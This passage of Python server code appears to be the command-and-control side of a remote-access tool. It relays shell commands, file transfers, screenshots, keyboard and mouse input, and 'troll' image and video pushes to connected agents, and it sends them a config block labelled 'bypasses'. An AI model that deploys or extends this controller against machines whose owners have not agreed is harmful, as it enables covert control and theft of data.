        disk_free_gb = round(disk.free / (1024**3), 1)
        
        # Get network information
        network_io = psutil.net_io_counters()
        network_upload_mb = round(network_io.bytes_sent / (1024**2), 1)
        network_download_mb = round(network_io.bytes_recv / (1024**2), 1)
        
        info['performance'] = {
            'cpu_percent': cpu_percent,
            'cpu_cores': cpu_count,
            'cpu_frequency_ghz': cpu_freq_ghz,
            'memory_percent': memory.percent,
            'memory_total_gb': memory_total_gb,
            'memory_used_gb': memory_used_gb,
            'memory_available_gb': memory_available_gb,
            'disk_percent': round((disk.used / disk.total) * 100, 1),
            'disk_total_gb': disk_total_gb,
            'disk_used_gb': disk_used_gb,
            'disk_free_gb': disk_free_gb,
            'network_upload_mb': network_upload_mb,
            'network_download_mb': network_download_mb,
            'boot_time': psutil.boot_time()
        }
    except ImportError:
        # psutil not available, provide placeholder data
        info['performance'] = {
            'cpu_percent': 0,
            'cpu_cores': 0,
            'cpu_frequency_ghz': 0,
            'memory_percent': 0,
            'memory_total_gb': 0,
            'memory_used_gb': 0,
            'memory_available_gb': 0,
            'disk_percent': 0,
            'disk_total_gb': 0,
            'disk_used_gb': 0,
            'disk_free_gb': 0,
            'network_upload_mb': 0,
            'network_download_mb': 0,
            'boot_time': 0,
            'error': 'psutil not available'
        }
    except Exception as e:
        # Other psutil errors (permissions, etc.)
        info['performance'] = {
            'cpu_percent': 0,
            'memory_percent': 0,
            'disk_percent': 0,
            'boot_time': 0,
            'error': f'Performance data unavailable: {str(e)}'
        }
    
    return jsonify(info)

@app.route('/api/debug/agents', methods=['GET'])
@require_auth
def debug_agents():
    """Debug endpoint to see raw agent data"""
    return jsonify({
        'agents_data': AGENTS_DATA,
        'agent_count': len(AGENTS_DATA),
        'agent_keys': list(AGENTS_DATA.keys())
    })

@app.route('/api/debug/broadcast-agents', methods=['POST'])
@require_auth
def broadcast_agents():
    """Manually broadcast agent list to all operators"""
    try:
        socketio.emit('agent_list_update', _agents_payload(), room='operators')
        return jsonify({
            'success': True,
            'message': f'Agent list broadcast to operators room',
            'agent_count': len(AGENTS_DATA),
            'agents': list(AGENTS_DATA.keys())
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Video/Audio Frame Storage
VIDEO_FRAMES_H264 = defaultdict(lambda: None)
CAMERA_FRAMES_H264 = defaultdict(lambda: None)
AUDIO_FRAMES_OPUS = defaultdict(lambda: None)

# --- Socket.IO Event Handlers ---

@socketio.on('connect')
def handle_connect():
    # Note: Socket.IO doesn't have direct access to Flask session
    # In a production environment, you'd want to implement proper Socket.IO authentication
    # For now, we'll allow connections but validate on specific events
    client_info = {
        'sid': request.sid,
        'remote_addr': request.environ.get('REMOTE_ADDR', 'unknown'),
        'user_agent': request.environ.get('HTTP_USER_AGENT', 'unknown')
    }
    print(f"Client connected: {client_info}")

@socketio.on('disconnect')
def handle_disconnect():
    # Find which agent disconnected and remove it
    disconnected_agent_id = None
    disconnected_agent_name = None
    
    for agent_id, data in AGENTS_DATA.items():
        if data["sid"] == request.sid:
            disconnected_agent_id = agent_id
            disconnected_agent_name = data.get("name", f"Agent-{agent_id}")
            break
    
    if disconnected_agent_id:
        try:
            AGENTS_DATA[disconnected_agent_id]["sid"] = None
        except Exception:
            pass
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Disconnected',
            'details': f'Agent {disconnected_agent_id} disconnected',
            'agent_id': disconnected_agent_id,
            'agent_name': disconnected_agent_name,
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'warning'
        }, room='operators', broadcast=True)
        
        print(f"Agent {disconnected_agent_id} disconnected.")
    else:
        print(f"Operator client disconnected: {request.sid}")
    try:
        if disconnected_agent_id:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyAgentOffline'):
                send_email_notification(
                    "Agent Disconnected",
                    f"Agent {disconnected_agent_name} ({disconnected_agent_id}) disconnected."
                )
    except Exception:
        pass

@socketio.on('operator_connect')
@require_socket_auth
def handle_operator_connect():
    """When a web dashboard connects."""
    print(f"Operator dashboard connecting with SID: {request.sid}")
    join_room('operators')
    print(f"Operator joined 'operators' room. Sending {len(AGENTS_DATA)} agents to new operator.")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    
    # Send agent list to the specific operator that just connected
    emit('agent_list_update', _agents_payload(), room=request.sid)
    # Confirm room joining
    emit('joined_room', 'operators', room=request.sid)

@socketio.on('join_room')
@require_socket_auth
def handle_join_room(room_name):
    """Handle explicit room joining requests."""
    print(f"🔍 Controller: Client {request.sid} requesting to join room: {room_name}")
    join_room(room_name)
    print(f"🔍 Controller: Client {request.sid} joined room: {room_name}")
    emit('joined_room', room_name, room=request.sid)
    
    # If joining operators room, also send agent list
    if room_name == 'operators':
        emit('agent_list_update', _agents_payload(), room=request.sid)
        print(f"Agent list sent to operator {request.sid}")

def _emit_agent_config(agent_id: str):
    try:
        agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
        if not agent_sid:
            return
        s = load_settings()
        payload = {
            'agent': s.get('agent', {}),
            'bypasses': s.get('bypasses', {}),
            'registry': s.get('registry', {})
        }
        emit('config_update', payload, room=agent_sid)
        try:
            ops_payload = {
                'agent': {'id': agent_id, **(payload.get('agent') or {})},
                'bypasses': payload.get('bypasses') or {},
                'registry': payload.get('registry') or {},
            }
            emit('config_update', ops_payload, room='operators', broadcast=True)
        except Exception:
            pass
    except Exception:
        pass

@socketio.on('operator_toggle_feature')
@require_socket_auth
def handle_operator_toggle_feature(data):
    try:
        feature = str((data or {}).get('feature') or '').strip()
        enabled = bool((data or {}).get('enabled'))
        agent_id = (data or {}).get('agent_id')
        ts = datetime.datetime.utcnow().isoformat() + 'Z'
        if agent_id:
            AGENT_FEATURE_FLAGS[agent_id][f'{feature}_enabled'] = enabled
            AGENT_FEATURE_FLAGS[agent_id]['last_updated'] = ts
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room=sid)
        else:
            emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room='agents', broadcast=True)
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'toggle',
            'action': f'{feature}:{("on" if enabled else "off")}',
            'details': f'{feature} {"enabled" if enabled else "disabled"}',
            'timestamp': ts,
            'status': 'success'
        }, room='operators', broadcast=True)
    except Exception as e:
        print(f"Error handling operator_toggle_feature: {e}")
    except Exception:
        pass

@socketio.on('troll_show_image')
@require_socket_auth
def handle_troll_show_image(data):
    try:
        agent_id = (data or {}).get('agent_id')
        payload = {
            'filename': (data or {}).get('filename'),
            'mime': (data or {}).get('mime'),
            'image_b64': (data or {}).get('image_b64'),
            'duration_ms': int((data or {}).get('duration_ms') or 5000),
            'mode': (data or {}).get('mode') or 'cover'
        }
        if agent_id:
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('troll_show_image', payload, room=sid)
                # Also emit to operators room for frontend notifications
                emit('troll_show_image', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
        else:
            emit('troll_show_image', payload, room='agents', broadcast=True)
            # Also emit to operators room for frontend notifications
            emit('troll_show_image', payload, room='operators', broadcast=True)
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'troll',
            'action': 'show_image',
            'details': payload.get('filename') or '',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
    except Exception:
        pass

@socketio.on('troll_show_video')
@require_socket_auth
def handle_troll_show_video(data):
    try:
        agent_id = (data or {}).get('agent_id')
        payload = {
            'filename': (data or {}).get('filename'),
            'mime': (data or {}).get('mime'),
            'video_b64': (data or {}).get('video_b64'),
            'duration_ms': int((data or {}).get('duration_ms') or 8000),
        }
        if agent_id:
            sid = AGENTS_DATA.get(agent_id, {}).get('sid')
            if sid:
                emit('troll_show_video', payload, room=sid)
                # Also emit to operators room for frontend notifications
                emit('troll_show_video', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
        else:
            emit('troll_show_video', payload, room='agents', broadcast=True)
            # Also emit to operators room for frontend notifications
            emit('troll_show_video', payload, room='operators', broadcast=True)
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'troll',
            'action': 'show_video',
            'details': payload.get('filename') or '',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
    except Exception:
        pass

@socketio.on('request_agent_list')
@require_socket_auth
def handle_request_agent_list():
    """Handle explicit request for agent list from dashboard"""
    print(f"Agent list requested by {request.sid}")
    print(f"Current agents: {list(AGENTS_DATA.keys())}")
    print(f"Agent data: {AGENTS_DATA}")
    emit('agent_list_update', _agents_payload(), room=request.sid)
    print(f"Agent list sent to {request.sid}")

@socketio.on('agent_connect')
def handle_agent_connect(data):
    """When an agent connects and registers itself."""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_connect data received: {data}")
            return
            
        agent_id = data.get('agent_id')
        if not agent_id:
            print("Agent connection attempt without agent_id")
            return
        if AGENT_AUTH_REQUIRED:
            token = data.get('token')
            if not verify_agent_token(agent_id, token or ''):
                emit('registration_error', {'message': 'Invalid agent token'}, room=request.sid)
                return
        
        ip_for_check = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        if ip_for_check and is_ip_blocked(ip_for_check.split(',')[0].strip()):
            emit('registration_error', {'message': 'Blocked IP'}, room=request.sid)
            return
        
        # Store agent information
        # Create agent entry if it doesn't exist
        if agent_id not in AGENTS_DATA:
            AGENTS_DATA[agent_id] = {}
            
        AGENTS_DATA[agent_id]["sid"] = request.sid
        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
        AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
        AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
        AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        AGENTS_DATA[agent_id]["is_admin"] = data.get('is_admin', False)
        AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
        AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
        AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
        
        join_room('agents')
        
        try:
            db = get_db()
            existing = db.query(DbAgent).filter(DbAgent.id == agent_id).first()
            if not existing:
                a = DbAgent(
                    id=agent_id,
                    name=AGENTS_DATA[agent_id]["name"],
                    platform=AGENTS_DATA[agent_id]["platform"],
                    ip=AGENTS_DATA[agent_id]["ip"],
                    last_seen=datetime.datetime.utcnow(),
                    capabilities=AGENTS_DATA[agent_id]["capabilities"],
                    metadata_json=AGENTS_DATA[agent_id].get("system_info", {})
                )
                db.add(a)
            else:
                existing.name = AGENTS_DATA[agent_id]["name"]
                existing.platform = AGENTS_DATA[agent_id]["platform"]
                existing.ip = AGENTS_DATA[agent_id]["ip"]
                existing.last_seen = datetime.datetime.utcnow()
                existing.capabilities = AGENTS_DATA[agent_id]["capabilities"]
                existing.metadata_json = AGENTS_DATA[agent_id].get("system_info", {})
            db.commit()
            db.close()
        except Exception:
            pass
        
        # Notify all operators of the new agent
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
        
        # Log activity
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully connected',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
        print(f"Agent {agent_id} connected with SID {request.sid}")
        print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
        try:
            _emit_agent_config(agent_id)
        except Exception:
            pass
        try:
            email_cfg = load_settings().get('email', {})
            if email_cfg.get('enabled') and email_cfg.get('notifyAgentOnline'):
                send_email_notification(
                    "Agent Connected",
                    f"Agent {AGENTS_DATA[agent_id]['name']} ({agent_id}) connected from {AGENTS_DATA[agent_id]['ip']}."
                )
        except Exception:
            pass
    except Exception as e:
        print(f"Error handling agent_connect: {e}")
        emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)

@socketio.on('execute_command')
@require_socket_auth
def handle_execute_command(data):
    """Operator issues a command to an agent."""
    agent_id = data.get('agent_id')
    command = data.get('command')
    platform = str(AGENTS_DATA.get(agent_id, {}).get('platform', 'windows')).lower()
    # Validation disabled per user request
    print(f"🔍 Controller: execute_command received for agent {agent_id}, command: {command}")
    print(f"🔍 Controller: Current AGENTS_DATA: {list(AGENTS_DATA.keys())}")
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        # Generate execution ID for tracking
        execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
        payload = {'execution_id': execution_id}
        shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
        if shared_secret:
            try:
                e2e = E2EEncryption(agent_id, shared_secret)
                payload['command'] = e2e.encrypt(str(command or ''))
                payload['encrypted'] = True
            except Exception:
                payload['command'] = command
        else:
            payload['command'] = command
        emit('command', payload, room=agent_sid)
        print(f"🔍 Controller: Sent command '{command}' to agent {agent_id} with execution_id {execution_id}")
        try:
            audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
        except Exception:
            pass
    else:
        print(f"🔍 Controller: Agent {agent_id} not found or disconnected. Available agents: {list(AGENTS_DATA.keys())}")
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)

@socketio.on('process_list')
def handle_process_list(data):
    """Agent sends structured process list; relay to operators."""
    agent_id = data.get('agent_id')
    processes = data.get('processes', [])
    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)

@socketio.on('process_operation_result')
def handle_process_operation_result(data):
    emit('process_operation_result', data, room='operators', broadcast=True)

@socketio.on('process_details_response')
def handle_process_details_response(data):
    emit('process_details_response', data, room='operators', broadcast=True)

@socketio.on('file_list')
def handle_file_list(data):
    """Agent sends structured directory listing; relay to operators."""
    agent_id = data.get('agent_id')
    path = data.get('path', '/')
    files = data.get('files', [])
    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators', broadcast=True)

@socketio.on('file_op_result')
def handle_file_op_result(data):
    """Relay file operation result to operators."""
    emit('file_op_result', data, room='operators', broadcast=True)

@socketio.on('command_output')
def handle_command_output(data):
    """Agent sends back the result of a command (legacy handler)."""
    agent_id = data.get('agent_id')
    output = data.get('output')
    
    # Forward the output to all operator dashboards
    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
    print(f"Received output from {agent_id}: {output[:100]}...")

@socketio.on('get_monitors')
def handle_get_monitors(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('get_monitors', {}, room=agent_sid)

@socketio.on('monitors_list')
def handle_monitors_list(data):
    emit('monitors_list_update', data, room='operators', broadcast=True)

@socketio.on('switch_monitor')
def handle_switch_monitor_request(data):
    agent_id = data.get('agent_id')
    monitor_index = data.get('monitor_index')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('switch_monitor', {'monitor_index': monitor_index}, room=agent_sid)

@socketio.on('set_display_mode')
def handle_set_display_mode(data):
    agent_id = data.get('agent_id')
    mode = data.get('mode')
    pip_monitor = data.get('pip_monitor')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('set_display_mode', {'mode': mode, 'pip_monitor': pip_monitor}, room=agent_sid)

@socketio.on('set_audio_volumes')
def handle_set_audio_volumes(data):
    agent_id = data.get('agent_id')
    mic_volume = data.get('mic_volume', 1.0)
    system_volume = data.get('system_volume', 1.0)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('set_audio_volumes', {'mic_volume': mic_volume, 'system_volume': system_volume}, room=agent_sid)

@socketio.on('toggle_noise_reduction')
def handle_toggle_noise_reduction(data):
    agent_id = data.get('agent_id')
    enabled = data.get('enabled', False)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('toggle_noise_reduction', {'enabled': enabled}, room=agent_sid)

@socketio.on('toggle_echo_cancellation')
def handle_toggle_echo_cancellation(data):
    agent_id = data.get('agent_id')
    enabled = data.get('enabled', False)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
@socketio.on('get_screenshot')
@require_socket_auth
def handle_get_screenshot(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('get_screenshot', {'agent_id': agent_id}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
@socketio.on('screenshot_response')
def handle_screenshot_response(data):
    emit('screenshot_response', data, room='operators', broadcast=True)
@socketio.on('agent_heartbeat')
def handle_agent_heartbeat(data):
    agent_id = (data or {}).get('agent_id')
    if not agent_id:
        return
    if agent_id not in AGENTS_DATA:
        AGENTS_DATA[agent_id] = {}
    prev_sid = AGENTS_DATA[agent_id].get('sid')
    AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
    AGENTS_DATA[agent_id]['sid'] = request.sid
    if not AGENTS_DATA[agent_id].get('name'):
        AGENTS_DATA[agent_id]['name'] = f'Agent-{agent_id}'
    if prev_sid != request.sid:
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)

@socketio.on('ping')
def handle_ping(data):
    """Handle ping from agent and respond with pong"""
    agent_id = data.get('agent_id')
    timestamp = data.get('timestamp')
    uptime = data.get('uptime', 0)
    
    # Update agent data if it exists
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
        AGENTS_DATA[agent_id]['uptime'] = uptime
        
        # Periodically update operators with agent status (every 10 pings to avoid spam)
        if not hasattr(handle_ping, 'ping_count'):
            handle_ping.ping_count = {}
        handle_ping.ping_count[agent_id] = handle_ping.ping_count.get(agent_id, 0) + 1
        
        if handle_ping.ping_count[agent_id] % 10 == 0:
            print(f"Updating operators with agent {agent_id} status after {handle_ping.ping_count[agent_id]} pings")
            emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
    
    # Send pong response
    emit('pong', {
        'agent_id': agent_id,
        'timestamp': timestamp,
        'server_time': datetime.datetime.utcnow().isoformat() + 'Z',
        'status': 'ok'
    })
    print(f"Ping received from {agent_id}, sent pong")

@socketio.on('agent_register')
def handle_agent_register(data):
    """Handle agent registration"""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_register data received: {data}")
            emit('registration_error', {'message': 'Invalid registration data'})
            return
            
        agent_id = data.get('agent_id')
        platform = data.get('platform', 'unknown')
        python_version = data.get('python_version', 'unknown')
        timestamp = data.get('timestamp')
        
        if not agent_id:
            emit('registration_error', {'message': 'Agent ID required'})
            return
        
        ip_for_check = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
        if ip_for_check and is_ip_blocked(ip_for_check.split(',')[0].strip()):
            emit('registration_error', {'message': 'Blocked IP'})
            return
        
        # Add agent to data with all required fields for dashboard
        AGENTS_DATA[agent_id] = {
            'agent_id': agent_id,
            'sid': request.sid,
            'name': f'Agent-{agent_id}',
            'platform': platform,
            'python_version': python_version,
            'ip': request.environ.get('REMOTE_ADDR', '0.0.0.0'),
            'connected_at': datetime.datetime.utcnow().isoformat() + 'Z',
            'last_seen': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'online',
            'capabilities': ['screen', 'files', 'commands'],
            'cpu_usage': 0,
            'memory_usage': 0,
            'network_usage': 0,
            'system_info': {
                'platform': platform,
                'python_version': python_version
            },
            'uptime': 0
        }
        
        print(f"Agent registered: {agent_id} ({platform})")
        print(f"Current agents: {list(AGENTS_DATA.keys())}")
        print(f"Emitting agent_list_update to operators room with {len(AGENTS_DATA)} agents")
        
        # Notify operators
        print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
        try:
            _emit_agent_config(agent_id)
        except Exception:
            pass
        
        # Log activity for operators
        emit('activity_update', {
            'id': f'act_{int(time.time())}',
            'type': 'connection',
            'action': 'Agent Connected',
            'details': f'Agent {agent_id} successfully registered',
            'agent_id': agent_id,
            'agent_name': AGENTS_DATA[agent_id]["name"],
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'status': 'success'
        }, room='operators', broadcast=True)
        
        # Send registration confirmation
        emit('agent_registered', {
            'agent_id': agent_id,
            'status': 'success',
            'message': 'Agent registered successfully'
        })
        
        print(f"Agent registration complete for {agent_id}")
        
    except Exception as e:
        print(f"Error handling agent_register: {e}")
        emit('registration_error', {'message': 'Registration failed due to server error'})

@socketio.on('live_key_press')
def handle_live_key_press(data):
    """Operator sends a live key press to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('key_press', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_move')
def handle_live_mouse_move(data):
    """Operator sends a live mouse move to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_move', data, room=agent_sid, include_self=False)

@socketio.on('live_mouse_click')
def handle_live_mouse_click(data):
    """Operator sends a live mouse click to an agent."""
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('mouse_click', data, room=agent_sid, include_self=False)

# --- Chunked File Transfer Handlers ---
@socketio.on('upload_file_chunk')
def handle_upload_file_chunk(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    chunk = data.get('chunk_data') or data.get('data') or data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size', 0)
    destination_path = data.get('destination_path') or data.get('destination')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('upload_file_chunk', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': filename,
            'destination': destination_path,
            'chunk': chunk,
            'offset': offset,
            'total_size': total_size
        }, room=agent_sid)
        print(f"📤 Forwarding upload chunk: {filename} offset {offset}/{total_size}")

@socketio.on('upload_file_end')
def handle_upload_file_end(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('upload_file_complete', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")

@socketio.on('upload_file_start')
def handle_upload_file_start(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('upload_file_start', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload start: {data.get('filename')} destined for {data.get('destination')}")

@socketio.on('upload_file_complete')
def handle_upload_file_complete(data):
    agent_id = data.get('agent_id')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('upload_file_complete', {
            'agent_id': agent_id,
            'upload_id': data.get('upload_id'),
            'filename': data.get('filename'),
            'destination': data.get('destination'),
            'total_size': data.get('total_size', 0)
        }, room=agent_sid)
        print(f"📦 Upload complete: {data.get('filename')} to {agent_id}")

@socketio.on('troll_asset_start')
def handle_troll_asset_start(data):
    upload_id = data.get('upload_id') or f'troll_{int(time.time())}'
    filename = data.get('filename') or 'asset.bin'
    total_size = int(data.get('total_size') or 0)
    TROLL_UPLOADS[upload_id] = {
        'filename': filename,
        'total_size': total_size,
        'received': 0,
        'chunks': [],
        'start_time': time.time()
    }
    emit('troll_asset_ready', {'upload_id': upload_id, 'status': 'started'}, room=request.sid)

@socketio.on('troll_asset_chunk')
def handle_troll_asset_chunk(data):
    upload_id = data.get('upload_id')
    if not upload_id or upload_id not in TROLL_UPLOADS:
        return
    payload = data.get('chunk')
    offset = int(data.get('offset') or 0)
    up = TROLL_UPLOADS[upload_id]
    try:
        if isinstance(payload, str):
            raw = base64.b64decode(payload)
        else:
            raw = bytes(payload or b'')
    except Exception:
        raw = bytes(payload or b'')
    up['chunks'].append((offset, raw))
    up['received'] += len(raw)
    progress = 0
    if up['total_size'] > 0:
        progress = int((up['received'] / up['total_size']) * 100)
    emit('troll_asset_progress', {'upload_id': upload_id, 'received': up['received'], 'total': up['total_size'], 'progress': progress}, room=request.sid)

@socketio.on('troll_asset_complete')
def handle_troll_asset_complete(data):
    upload_id = data.get('upload_id')
    if not upload_id or upload_id not in TROLL_UPLOADS:
        emit('troll_asset_ready', {'upload_id': upload_id, 'error': 'unknown upload'}, room=request.sid)
        return
    up = TROLL_UPLOADS.pop(upload_id)
    up['chunks'].sort(key=lambda x: x[0])
    file_bytes = b''.join([c for _, c in up['chunks']])
    assets_dir = os.path.join(os.path.dirname(__file__), 'troll-assets')
    os.makedirs(assets_dir, exist_ok=True)
    asset_id = uuid.uuid4().hex
    _, ext = os.path.splitext(up['filename'])
    filename = f'{asset_id}{ext or ""}'
    full_path = os.path.join(assets_dir, filename)
    with open(full_path, 'wb') as f:
        f.write(file_bytes)
    expires = int(time.time() + 3600)
    sig_src = f'{asset_id}.{expires}.{Config.SECRET_KEY}'
    signature = hashlib.sha256(sig_src.encode()).hexdigest()
    TROLL_ASSETS[asset_id] = {
        'path': full_path,
        'filename': up['filename'],
        'expires': expires,
        'created_at': time.time(),
        'size': len(file_bytes)
    }
    # Build absolute URL
    try:
        base_url = request.host_url.rstrip('/')
    except Exception:
        base_url = f"http://{Config.HOST}:{Config.PORT}"
    url = f"{base_url}/troll-assets/{asset_id}?exp={expires}&sig={signature}"
    emit('troll_asset_ready', {'upload_id': upload_id, 'asset_id': asset_id, 'url': url, 'size': len(file_bytes)}, room=request.sid)

@socketio.on('download_file')
def handle_download_file(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    local_path = data.get('local_path')
    path = data.get('path') or filename
    download_id = data.get('download_id') or filename
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        print(f"Requesting download of '{filename}' from {agent_id} to local path {local_path}")
        if download_id not in DOWNLOAD_BUFFERS:
            DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": 0, "local_path": None, "requester_sid": request.sid}
        else:
            DOWNLOAD_BUFFERS[download_id]["requester_sid"] = request.sid
        DOWNLOAD_BUFFERS[download_id]["local_path"] = local_path
        emit('request_file_chunk_from_agent', {'filename': filename, 'path': path, 'download_id': download_id}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found.', 'type': 'error'}, room=request.sid)

@socketio.on('file_chunk_from_agent')
def handle_file_chunk_from_agent(data):
    agent_id = data.get('agent_id')
    filename = data.get('filename')
    download_id = data.get('download_id') or filename
    chunk = data.get('chunk')
    offset = data.get('offset')
    total_size = data.get('total_size')
    error = data.get('error')

    if error:
        emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'download_id': download_id, 'error': error}, room='operators')
        if download_id in DOWNLOAD_BUFFERS: del DOWNLOAD_BUFFERS[download_id]
        return

    if download_id not in DOWNLOAD_BUFFERS:
        DOWNLOAD_BUFFERS[download_id] = {"chunks": [], "total_size": total_size, "local_path": None}

    if isinstance(chunk, str):
        payload = chunk.split(',', 1)[1] if ',' in chunk else chunk
        DOWNLOAD_BUFFERS[download_id]["chunks"].append(base64.b64decode(payload))
    DOWNLOAD_BUFFERS[download_id]["total_size"] = total_size # Update total size in case it was not set initially

    current_download_size = sum(len(c) for c in DOWNLOAD_BUFFERS[download_id]["chunks"])

    # If all chunks received, save the file locally
    if current_download_size >= total_size:
        full_content = b"".join(DOWNLOAD_BUFFERS[download_id]["chunks"])
        local_path = DOWNLOAD_BUFFERS[download_id]["local_path"]
        requester_sid = DOWNLOAD_BUFFERS[download_id].get("requester_sid")

        if local_path:
            try:
                # Ensure directory exists
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                with open(local_path, 'wb') as f:
                    f.write(full_content)
                print(f"Successfully downloaded {filename} to {local_path}")
                emit('file_download_chunk', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'download_id': download_id,
                    'chunk': chunk,
                    'offset': offset,
                    'total_size': total_size,
                    'local_path': local_path # Pass local_path back to frontend
                }, room=requester_sid or 'operators')
            except Exception as e:
                print(f"Error saving downloaded file {filename} to {local_path}: {e}")
                emit('file_download_chunk', {'agent_id': agent_id, 'filename': filename, 'error': f'Error saving to local path: {e}'}, room=requester_sid or 'operators')
        else:
